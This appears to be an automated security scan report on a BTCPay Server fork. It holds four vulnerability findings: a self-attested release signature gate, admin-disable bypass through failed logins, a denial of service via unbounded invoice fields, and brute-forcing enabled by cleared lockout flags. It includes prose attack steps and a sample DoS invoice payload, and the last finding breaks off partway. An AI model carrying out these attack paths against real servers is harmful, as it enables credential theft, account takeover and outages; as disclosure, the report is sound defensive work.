# Release signature gate is self-attested: keys, verifier and workflow come from the tagged commit

## Details
The release pipeline's only authenticity control before the official Docker image is pushed with the project's Docker Hub credentials is `.github/scripts/verify-signed-commit.sh`. It imports every `*.asc` file found in `.github/scripts/` of the checked-out tag (line 6) and requires `git log -1 --format=%G? HEAD` to be G or U (lines 8-11). Because `release.yml` is triggered by `push: tags: v*` (lines 3-6) and GitHub executes the workflow definition contained in the pushed tag's commit, and because the `docker` job (lines 68-98) checks out that same commit before running the verifier, the key set, the verifier script and the workflow that decides whether verification runs at all are all authored by the commit whose authenticity is being established. The control is self-attesting and adds nothing above "can push a tag matching v*":

1. A tag may point at a commit that adds its author's own `.asc` key under `.github/scripts/`; `gpg --import` accepts it and the author's signature yields G or U.
2. A tag may point at a commit that edits `release.yml` to drop the "Verify commit is signed" step, or edits `verify-signed-commit.sh` to `exit 0`; GitHub runs that workflow version, so the check never executes. The commit need not be reachable from any branch, so branch protection and review requirements on `master` are not consulted.
3. Only the HEAD commit is checked and tag objects are never verified (publish-docker.sh / .ps1 create annotated, unsigned tags). A tag may therefore be pointed at any existing maintainer-signed commit (an old vulnerable release, an unmerged branch) and published under any version number, including an existing one: `docker buildx build --push -t ${DOCKERHUB_REPO}:${LATEST_TAG}` (lines 90-97) overwrites the Docker Hub tag without checking that it already exists, and the sanctioned tool force-pushes tags (publish-docker.sh:14).

Independently, `trigger_docs_build` (lines 15-28) hands `secrets.GH_PAT` (a maintainer personal access token) to every `v*` tag-push run with no check whatsoever.

Position and gain: the attacker is any GitHub principal able to push a `v*` tag who does not hold one of the three signing keys — every write-access collaborator unless a GitHub tag ruleset restricts `v*`, and in any case the compromised GitHub account of a permitted tagger. The project concedes to that position only the triggering of a build of a key-holder-signed commit (docs/maintainers/README.md:91,127: releases published by two named maintainers, release commit GPG-signed). This path instead hands them (a) arbitrary code execution in a job holding `DOCKERHUB_USER`, `DOCKERHUB_PASS`, `DOCKERHUB_REPO` and `GH_PAT`, exfiltrable by editing the workflow, which yields persistent push access to the official Docker Hub repository outside GitHub entirely; and (b) publication of an arbitrary image under the official repository and version tag that btcpayserver-docker deployments pull, including silently replacing the image behind an already-released version.

The repository contains no `environment:` with required reviewers, no deployment tag policy and no documentation of a tag ruleset. Even where a ruleset restricts `v*` creation to the key holders, the GPG step still fails the one purpose a second factor would serve — defending against a permitted tagger's compromised GitHub account — because that account controls the workflow and key set too. As written the step only catches a maintainer accidentally tagging an unsigned commit (e.g. a GitHub-UI merge), which the checklist warns about; it is a process guard, not the authenticity boundary its placement before the Docker Hub login implies.

## Evidence
1. [.github/scripts/verify-signed-commit.sh:6–16](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/.github/scripts/verify-signed-commit.sh#L6-L16)
   The trust anchor is `gpg --batch --import "$SCRIPT_DIR"/*.asc`, i.e. whatever key files exist in the checkout being verified. Only `git log -1 HEAD` is checked (the tag object itself is never verified) and the case accepts G|U, so any key present in that directory validates the commit.
2. [.github/workflows/release.yml:68–97](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/.github/workflows/release.yml#L68-L97)
   The `docker` job checks out the pushed tag, runs the verifier that ships inside that same checkout, logs into Docker Hub with DOCKERHUB_USER/DOCKERHUB_PASS and pushes `${DOCKERHUB_REPO}:${GITHUB_REF_NAME#v}` unconditionally. No `environment:` with required reviewers gates the secrets, and an existing Docker Hub tag is silently overwritten on re-push.
3. [.github/workflows/release.yml:3–6](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/.github/workflows/release.yml#L3-L6)
   Trigger is `push: tags: v*`. GitHub executes the workflow definition contained in the pushed tag's commit, so the commit under verification also supplies the workflow that decides whether verification runs at all.
4. [.github/workflows/release.yml:15–28](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/.github/workflows/release.yml#L15-L28)
   `trigger_docs_build` exposes `secrets.GH_PAT` (a maintainer personal access token) to the same tag-triggered workflow with no gate whatsoever, not even the GPG check.
5. [publish-docker.sh:12–14](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/publish-docker.sh#L12-L14)
   The sanctioned release tool creates an annotated (unsigned) tag and pushes it with `--force`; the process therefore normalises re-pointing an existing release tag, which the workflow turns into an overwritten Docker Hub image tag.
6. [docs/maintainers/README.md:119–131](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/docs/maintainers/README.md#L119-L131)
   States the intended boundary: releases are published by two named maintainers and the release commit must be GPG-signed. The implemented gate does not enforce that boundary against anyone else who can push a `v*` tag.

## Impact
The vulnerable system is the release pipeline and its credentials. Confidentiality HIGH: DOCKERHUB_PASS and GH_PAT (a maintainer PAT whose scope is unknown; a classic `repo`-scoped PAT would reach other repositories) can be exfiltrated. Integrity HIGH: arbitrary content is published under the official Docker Hub repository and version tag, and existing tags can be overwritten. Availability LOW: the attacker can break or replace releases but the pipeline itself remains usable. Subsequent-system impact: The published image is the artifact every btcpayserver-docker deployment runs as root; a poisoned image under an official version tag executes on merchants' servers with access to hot-wallet seeds, DataProtection keys, database and Lightning credentials. This crosses from the project's CI into its users' systems.

## Reproduction steps
1. Attacker: a GitHub principal permitted to push a `v*` tag to btcpayserver/btcpayserver who does not hold one of the three signing keys — any write-access collaborator (no tag ruleset or environment protection is referenced anywhere in the repository), or the compromised GitHub account of a release maintainer without their GPG key. They push tag vX.Y.Z at a commit (reachable from no branch, so master protections are not consulted) that adds their own .asc key or simply removes the verify step and prints/exfiltrates the secrets; GitHub runs the workflow from that commit, DOCKERHUB_* and GH_PAT are in scope, and the image built from the attacker's tree is pushed to the official repository. No special execution condition is required: the workflow fires on every v* push (AT:N); the position needs repository write privileges (PR:H); no victim interaction (UI:N); over the network (AV:N); trivially scripted (AC:L).

## Recommended fix
1. The verification trust anchor (the .asc key set) and the verifier are read from the artifact under verification, so a tag author controls both. Fix criteria: Signature verification must use a key set and verifier that the tagged commit cannot change: e.g. keys fetched from a pinned location on the protected default branch or stored as repository variables/secrets, verified in a workflow that is not sourced from the tag. A commit that adds a new .asc file or edits the verifier must not be able to pass the gate.
2. Release secrets are granted to any push-triggered run of a `v*` tag; the `docker` and `trigger_docs_build` jobs have no environment protection, so anyone who can create such a tag receives DOCKERHUB_* and GH_PAT. Fix criteria: Secrets must only be reachable after an authorization check the tag pusher cannot influence: bind the publishing jobs to a GitHub Environment with required reviewers and a deployment tag policy, and restrict creation of `v*` tags to release maintainers via a tag ruleset. Verify by pushing a `v*` tag from a non-maintainer write-access account: no job holding secrets may run.
3. Only the HEAD commit is checked, tags are unsigned, and the workflow overwrites an existing Docker Hub tag, so any maintainer-signed commit can be republished under any version. Fix criteria: Verify the signature of the tag object itself (signed tags) in addition to the commit, and refuse to push when `${DOCKERHUB_REPO}:${LATEST_TAG}` already exists (or publish by digest and treat release tags as immutable). Re-pushing an existing version tag must not change the image behind it.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Improper signature verification
**CWE:** [CWE-347](https://cwe.mitre.org/data/definitions/347.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257642

---

# Anonymous failed logins overwrite admin 'disabled' lockout, re-enabling a disabled account after 5 minutes

## Details
BTCPay Server implements the administrative 'disable user' action (server UI POST /server/users/{id}/toggle and Greenfield POST /api/v1/users/{id}/lock, both via UserService.SetDisabled) by setting the ASP.NET Identity lockout field: SetDisabled calls SetLockoutEndDateAsync(user, DateTimeOffset.MaxValue). ApplicationUser.IsDisabled is derived from that same LockoutEnd column, and IsDisabledTemporarily (brute-force lockout) differs from the administrative disable only by LockoutEnd not being MaxValue. The disabled state is thus stored in data the design assumes immutable-until-admin-re-enables, but which the framework rewrites during ordinary failed-login accounting.

The anonymous login handler UIAccountController.Login (POST /login, [AllowAnonymous], Method=Password) looks the user up by email, runs userManager.CheckPasswordAsync (which verifies only the hash and consults no lockout state), and on a wrong password calls userManager.AccessFailedAsync(user) whenever !user.IsDisabledTemporarily. For an admin-disabled account IsDisabledTemporarily is false, so the failed-attempt counter of a disabled account is incremented by anyone who knows its email, with no CanLogin check having run. Assumption (Microsoft.AspNetCore.Identity.EntityFrameworkCore 10.0.12 / Microsoft.Extensions.Identity.Core, net10.0 shared framework): UserManager.AccessFailedAsync increments AccessFailedCount and, when it reaches Options.Lockout.MaxFailedAccessAttempts (5 here), unconditionally stores LockoutEnd = UtcNow + DefaultLockoutTimeSpan (5 minutes) and resets the counter; it never compares against the existing LockoutEnd. The permanent disable (MaxValue) is thereby replaced by a 5-minute temporary lockout. After those 5 minutes IsDisabled is false and DefaultLoginExtension no longer adds a failure: cookie login succeeds, every existing API key of the account authenticates again (APIKeysAuthenticationHandler gates only on UserService.CanLogin), and Greenfield Basic auth works where the user had enabled it.

Attack: a disabled user (dismissed employee, hostile tenant, or anyone holding a disabled account's password or API key) fetches the login page for an antiforgery token, sends five POST /login requests with the account's email and a wrong password (the per-IP login zone is 5r/min, and X-Forwarded-For is trusted from any peer), waits five minutes, and logs in normally or resumes using the account's API keys. The same overwrite is reachable on POST /login/authenticator with five wrong TOTP codes once the password check has issued the 2FA cookie. No admin involvement and no notification; the administrator's revocation is silently undone (the only residue is the store's noActiveUser flag, which does not gate account, wallet or settings access). The project's own integration test DisabledEnabledUserTests asserts that a locked user's API key and Basic auth must be rejected, which this path defeats. Monetization-locked subscribers are not affected in the same way: MonetizationLoginExtension independently fails CanLogin for inactive/suspended subscribers regardless of LockoutEnd.

Root cause: the security-relevant 'disabled' state is overloaded onto a field that the framework mutates as part of failed-login handling, and the login handlers gate AccessFailedAsync on IsDisabledTemporarily instead of short-circuiting on IsDisabled.

## Evidence
1. [BTCPayServer/Controllers/UIAccountController.cs:177–200](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L177-L200)
   Anonymous POST /login with Method=Password: FindByEmailAsync, then CheckPasswordAsync (hash only, no lockout check); on failure AccessFailedAsync(user) runs whenever !user.IsDisabledTemporarily. An admin-disabled user (LockoutEnd == DateTimeOffset.MaxValue) has IsDisabledTemporarily == false, so every wrong password increments the disabled account's failure counter; on the 5th failure Identity stores LockoutEnd = now+5min, destroying the permanent disable. CanLogin (which checks IsDisabled) is only consulted later in RedirectLoginSuccess.
2. [BTCPayServer.Data/Data/ApplicationUser.cs:38–44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/ApplicationUser.cs#L38-L44)
   The 'disabled' state is not a dedicated flag: IsDisabled is derived from LockoutEnabled && LockoutEnd > now, and IsDisabledTemporarily distinguishes admin-disable (LockoutEnd == MaxValue) from brute-force lockout only by the value of the same mutable LockoutEnd column.
3. [BTCPayServer/Services/UserService.cs:212–238](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L212-L238)
   SetDisabled(userId, true) - used by UIServerController.ToggleUserPost and Greenfield POST /api/v1/users/{id}/lock - implements 'disable' purely as SetLockoutEndDateAsync(user, DateTimeOffset.MaxValue) plus a security-stamp rotation. Nothing re-applies the value afterwards, so a later AccessFailedAsync overwrite is permanent until an admin acts again.
4. [BTCPayServer/Services/UserService.cs:158–172](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L158-L172)
   DefaultLoginExtension is the only control that enforces the disable: it adds a failure when user.IsDisabled is true. Once LockoutEnd has elapsed, IsDisabled is false and CanLogin passes for cookie login, API keys and Basic auth alike.
5. [BTCPayServer/Controllers/UIAccountController.cs:455–473](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L455-L473)
   Same pattern on POST /login/authenticator: only IsDisabledTemporarily is checked before AccessFailedAsync(user); a disabled user whose correct password is known reaches this step (password check succeeded, 2FA cookie issued) and five wrong TOTP codes also convert the permanent disable into a 5-minute lockout.
6. [BTCPayServer/Hosting/Startup.cs:213–223](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L213-L223)
   Lockout configuration: MaxFailedAccessAttempts = 5, DefaultLockoutTimeSpan = 5 minutes, AllowedForNewUsers = true. These values make the overwrite cheap: 5 requests, then a 5-minute wait.
7. [BTCPayServer/Security/GreenField/APIKeysAuthenticationHandler.cs:55–56](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/GreenField/APIKeysAuthenticationHandler.cs#L55-L56)
   API-key authentication is gated only by UserService.CanLogin (IsDisabled); no security-stamp check. Once LockoutEnd expires, all of the formerly disabled account's API keys authenticate again, so a disabled account's API key regains access without any password.
8. [BTCPayServer.Tests/GreenfieldAPITests.cs:3695–3704](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/GreenfieldAPITests.cs#L3695-L3704)
   The project's own contract for the control being bypassed: DisabledEnabledUserTests asserts that after LockUser(true) the user's API key and Basic auth both fail with 'unauthenticated'. The lockout overwrite defeats exactly this guarantee.

## Impact
The administrator's access revocation is silently defeated with no notification. The re-enabled account regains all of its previous capabilities: its stores, invoices, wallets (including hot-wallet spending and payouts for store owners), API keys and settings - the data and operations the admin intended to cut off. Confidentiality and integrity of everything that account could reach are fully exposed; availability impact is limited to what the account could already disrupt (store/invoice deletion). The only residue of the disable is the store noActiveUser flag, which gates public invoice creation, not account access.

## Reproduction steps
1. Attacker is anonymous and needs only the disabled account's email (a disabled user knows their own); to use the re-enabled account they need its password or an existing API key, which the disabled holder possesses. Five POST /login requests with a wrong password (antiforgery token from the public login page; login zone 5r/min per IP, and X-Forwarded-For is trusted from any peer) trigger Identity's lockout path which overwrites LockoutEnd=MaxValue with now+5min; after 5 minutes CanLogin passes. Works on the default configuration; no race, no user interaction. Depends on the assumed behaviour of UserManager.AccessFailedAsync in Microsoft.AspNetCore.Identity 10.0.12 (sets LockoutEnd unconditionally once the threshold is reached).

## Recommended fix
1. The 'disabled' state is stored in Identity's LockoutEnd column, which the framework overwrites during normal failed-login accounting, so an administrative disable can be undone by anonymous failed login attempts. Fix criteria: Administrative disabling must be represented by state that failed-login handling never modifies (e.g. a dedicated Disabled flag checked by CanLogin, the Greenfield handlers and the UI), or AccessFailedAsync must never be invoked for a user whose LockoutEnd marks an administrative disable. Verification: disable a user, submit 5+ wrong passwords (and, with the password, 5+ wrong TOTP codes), wait past DefaultLockoutTimeSpan, and confirm the user, their Basic auth and their API keys remain rejected and IsDisabled remains true.
2. UIAccountController.Login and LoginWithAuthenticator gate AccessFailedAsync on IsDisabledTemporarily rather than IsDisabled, so disabled (non-temporarily-locked) accounts are the exact population whose lockout field gets mutated. Fix criteria: Login handlers must short-circuit for any disabled account before password/2FA verification and before any lockout bookkeeping, returning the same response regardless of password correctness so the fix does not introduce a password oracle. Verification: for a disabled account, wrong and correct passwords yield identical responses and AccessFailedCount/LockoutEnd are unchanged.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Authentication bypass
**CWE:** [CWE-302](https://cwe.mitre.org/data/definitions/302.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257277

---

# Anonymous Bitpay invoices with unbounded expirationTime and posData stay monitored forever and are reloaded every block

## Details
Two unbounded, caller-controlled fields of the legacy Bitpay invoice API (POST /invoices, anonymous when the store's 'Allow anyone to create invoice' toggle is on) combine into a permanent, self-renewing cost on the payment-detection path shared by every store.

1. `expirationTime` (unix ms, DateTimeJsonConverter rejects only negatives) is copied verbatim into entity.ExpirationTime at BitpayInvoiceController.cs:132; the only check is `ExpirationTime - 30s >= InvoiceTime` (134-137). Neither UIInvoiceController.CreateInvoiceCoreRaw(entity, ...) nor InvoiceRepository.CreateInvoiceAsync caps it to the store's InvoiceExpiration (default 15 min). The only place an invoice leaves status New without payment is InvoiceWatcher.UpdateInvoice:81, which requires ExpirationTime <= now; with a far-future value (e.g. year 2200) that never happens. (Wait() additionally cannot schedule the delay: Task.Delay throws for > ~49.7 days and the fire-and-forget task faults silently, so no later Watch fires either.)
2. `posData` is stored verbatim into the invoice blob (InvoiceEntity.PosDataLegacy:197-219, parsed JObject or raw string) with no size limit; Kestrel's body limit is int.MaxValue (any smaller cap comes only from a front proxy).

`is_pending(Status)` is `New OR Processing` (003.RefactorPendingInvoicesPayments.sql), so every such invoice with an activated on-chain prompt (LazyPaymentMethods default false) is returned by get_monitored_invoices (004.MonitoredInvoices.sql) regardless of age or Archived flag. NBXplorerListener.UpdatePaymentStates(wallet) (231-235) calls GetMonitoredInvoices on EVERY NewBlockEvent (151) and FindPaymentViaPolling (383) on connect/reconnect; LightningListener.CheckingInvoice (81) on startup. GetMonitoredInvoices (InvoiceRepository.cs:116-170) selects `to_jsonb(i)` — the whole row including Blob2 — for each pending invoice and makes several full passes (JObject.Parse, Blob2 ToString, ToObject<InvoiceData>, GetBlob deserialisation), and UpdatePaymentStates holds all resulting entities in one array for Task.WhenAll.

An anonymous caller therefore creates invoices that (a) never leave the monitored set and (b) each weigh as much as the body limit allows, e.g. `{"price":0.01,"currency":"USD","expirationTime":7258118400000,"posData":"<very large JSON>"}`. Spread over forwardable X-Forwarded-For addresses to dodge the 4/min PublicInvoices throttle (established fact), a few dozen such requests make every new block transfer and re-parse gigabytes of JSON — delaying or OOM-crashing payment detection for all stores, and the same set is reloaded on every listener restart (crash loop). Unlike sanctioned anonymous invoices (pay button / PoS use the store's expiration and typed metadata), this never ages out: archiving does not change Status, there is no stale-pending cleanup job, and the merchant must mark each invoice Invalid individually (ChangeInvoiceState / Greenfield MarkInvoiceStatus) to remove it.

The same lack of an upper bound exists on Greenfield CreateInvoice (Checkout.Expiration minimum only, GreenfieldInvoiceController.cs:199-202; metadata unbounded) but requires a CanCreateInvoice key; the Bitpay path is the anonymous one.

Assumptions: Task.Delay(TimeSpan) in .NET 10 rejects delays above uint.MaxValue-1 ms with ArgumentOutOfRangeException as in .NET 6-9; PostgreSQL jsonb accepts string values up to ~256 MB.

## Evidence
1. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:131–137](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L131-L137)
   ExpirationTime is taken verbatim from the request (only a 30-second lower bound is enforced); MonitoringExpiration is derived from it. Nothing caps it to the store's configured expiration.
2. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:139–140](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L139-L140)
   The caller's posData string (any size; Kestrel MaxRequestBodySize is int.MaxValue per established fact) is stored into the invoice blob via PosDataLegacy.
3. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:50–65](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L50-L65)
   Anonymous creation on AnyoneCanInvoice stores (BitpayAuthorizationHandler grants CanCreateInvoice to the Anonymous identity), throttled only by the forwardable remote IP.
4. [BTCPayServer/HostedServices/InvoiceWatcher.cs:78–89](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L78-L89)
   Expiry is only applied when a Watch runs and ExpirationTime has passed; with a far-future ExpirationTime the invoice stays New (pending) indefinitely. No other component expires or archives stale pending invoices.
5. [BTCPayServer/HostedServices/InvoiceWatcher.cs:192–221](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L192-L221)
   Wait() schedules Task.Delay(ExpirationTime - now); for delays beyond Task.Delay's limit (~49.7 days) this throws ArgumentOutOfRangeException, not caught by the `when (_Cts.IsCancellationRequested)` filter, so the fire-and-forget task faults silently and no later Watch is scheduled.
6. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:231–234](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L231-L234)
   UpdatePaymentStates(wallet) loads every monitored invoice via GetMonitoredInvoices and holds all entities in one array for Task.WhenAll.
7. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:148–152](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L148-L152)
   On every NewBlockEvent UpdatePaymentStates(wallet) runs, so the full monitored set is reloaded per block.
8. [BTCPayServer/Services/Invoices/InvoiceRepository.cs:116–169](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceRepository.cs#L116-L169)
   GetMonitoredInvoices returns to_jsonb(i) of each pending invoice (whole Blob2 including metadata/posData) and parses it with JObject.Parse, ToString, ToObject<InvoiceData> and ToEntity/GetBlob — several full passes over each blob, with no size or count bound.
9. [BTCPayServer.Data/DBScripts/004.MonitoredInvoices.sql:7–22](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/DBScripts/004.MonitoredInvoices.sql#L7-L22)
   Every invoice with is_pending(Status) (= New or Processing, 003.RefactorPendingInvoicesPayments.sql) and an activated prompt for the payment method is monitored, regardless of age or Archived flag.
10. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:378–383](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L378-L383)
   FindPaymentViaPolling (startup/reconnect) also loads the full monitored set; LightningListener.CheckingInvoice (LightningListener.cs:81) does the same for Lightning, so a crash on load repeats at every restart.

## Impact
Persistent, cumulative degradation of the server-wide on-chain payment detection loop: every new block reloads and re-parses the attacker's blobs (multiple in-memory copies per invoice, all held at once), up to OOM and a restart loop since the same set is reloaded on connect; permanent database growth. Affects all tenants and never ages out without per-invoice manual marking. No confidentiality impact and no direct integrity impact.

## Reproduction steps
1. Unauthenticated attacker POSTs JSON to the Bitpay /invoices endpoint (?storeId=) of a store with 'Allow anyone to create invoice' enabled, each with a far-future expirationTime and a large posData. No payment, no user interaction; the PublicInvoices 4/min throttle is keyed on a forwardable remote IP. Requires the target store to have the non-default AnyoneCanInvoice toggle on and an on-chain wallet so an activated prompt exists — AT:PRESENT.

## Recommended fix
1. Bitpay (and Greenfield) invoice creation accepts an unbounded expiration, so attacker invoices never leave the pending/monitored set. Fix criteria: Caller-supplied expiration is capped (e.g. to the store's InvoiceExpiration or a fixed maximum such as a few days); every created invoice is guaranteed to expire and be removed from monitoring.
2. posData/metadata size is unbounded and the whole blob is reloaded for every monitored invoice on each block. Fix criteria: Enforce a size limit on posData/metadata at creation on all entry points, and make the monitoring query select only the fields the listeners need rather than the entire blob, so a single invoice cannot add more than a bounded cost per block.

---
**Severity:** HIGH
**Status:** Open
**Category:** Uncontrolled resource consumption
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257713

---

# Monetization lockout SQL clears LockoutEnabled for active subscribers, disabling failed-login lockout

## Details
The Monetization plugin encodes 'account enabled/disabled' into the ASP.NET Identity columns LockoutEnabled/LockoutEnd. UpdateUserLockoutStatus (MonetizationHostedService.cs 367-408) issues raw SQL `SET "LockoutEnabled" = NOT (ss.active AND @canAccess), "LockoutEnd" = CASE ... NULL ...` for the users of a plan. In the normal case (active subscription on a plan carrying the can-access feature) this writes LockoutEnabled = false; the WHERE clause only skips rows already in that state.

LockoutEnabled is Identity's per-user switch for failed-login lockout, and BTCPay's own gates are built on it: ApplicationUser.IsDisabled is `LockoutEnabled && LockoutEnd > now` (ApplicationUser.cs 39-41) and IsDisabledTemporarily derives from it (43-44). POST /login verifies the password with userManager.CheckPasswordAsync (no Identity lockout check), calls AccessFailedAsync on failure, and refuses further attempts only when user.IsDisabledTemporarily is true (UIAccountController.cs 177-200; same gate at 340, 403, 460 for the 2FA steps). After the SQL has run, AccessFailedAsync still writes LockoutEnd = now+5min after 5 wrong passwords, but with LockoutEnabled = false the account is never treated as locked and guessing continues without bound. UserService.SetDisabled (UserService.cs 219-220) re-enables LockoutEnabled before touching LockoutEnd, showing the intended invariant; the Monetization SQL is the only writer of false in the tree, and SetDisabled(false) on later activation returns Unchanged (217) without repairing it.

Reach: the SQL runs (a) for every self-registered or admin/API-created user, because UserEvent.Registered (UIAccountController.cs 579, GreenfieldUsersController.cs 428, store invitations) with no existing subscriber is routed through MigrateUsers(OneUserQuery) -> UpdateUserLockoutStatus (158-185, 360); the activation starter plan carries can-access (UIServerMonetizationController.cs 188-195) and defaults to a 7-day trial (MonetizationViewModel.cs 55), so active = hasTrial = true and every new account has LockoutEnabled cleared at creation; (b) for all existing non-admin users when the admin ticks 'Migrate existing users' on activation or runs 'migrate-users' (UIServerMonetizationController.cs 242-247, 284-300); (c) for every active subscriber in a plan whenever any plan edit publishes PlanUpdated (91-96), which also re-clears the flag for users whose state SetDisabled had restored. Users created from the anonymous subscription portal (56-77) are attached to their subscriber before Registered is handled and so are only affected by (c).

Impact: an anonymous attacker brute-forces subscriber passwords (policy: 6 characters, no complexity, Startup.cs 214-219) with no per-account throttle. The remaining per-IP login limit (5r/min, Startup.cs 306) is keyed on RemoteAddress, which honours X-Forwarded-For from any peer (Startup.cs 324-333, established fact), so it is bypassed by header rotation. A successful guess yields the victim's account, stores, wallets and API keys.

Condition: Monetization activated (MonetizationSettings.OfferingId/DefaultPlanId set) - a supported feature used as designed, not a disabled control. Dependency assumption: Microsoft.AspNetCore.Identity.EntityFrameworkCore 10.0.12 (BTCPayServer.Data.csproj) - UserManager.AccessFailedAsync sets LockoutEnd without consulting LockoutEnabled, CheckPasswordAsync performs no lockout check, and only IsLockedOutAsync (used solely by SignInManager.CheckPasswordSignInAsync in the Greenfield Basic auth handler) consults LockoutEnabled; the UI login actions rely on BTCPay's own IsDisabledTemporarily.

## Evidence
1. [BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs:367–407](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Monetization/MonetizationHostedService.cs#L367-L407)
   UpdateUserLockoutStatus runs raw SQL setting AspNetUsers."LockoutEnabled" = NOT (ss.active AND @canAccess) and "LockoutEnd" = NULL for active subscribers on a can-access plan (379-380, 388-389). The WHERE clause (391) only skips rows already in that state, so a freshly created user (LockoutEnabled = true via Lockout.AllowedForNewUsers) is updated to LockoutEnabled = false. This is the code the fix must change.
2. [BTCPayServer.Data/Data/ApplicationUser.cs:38–44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/ApplicationUser.cs#L38-L44)
   IsDisabled is true only when LockoutEnabled is true AND LockoutEnd is in the future; IsDisabledTemporarily derives from it. With LockoutEnabled = false both are false regardless of what AccessFailedAsync writes to LockoutEnd.
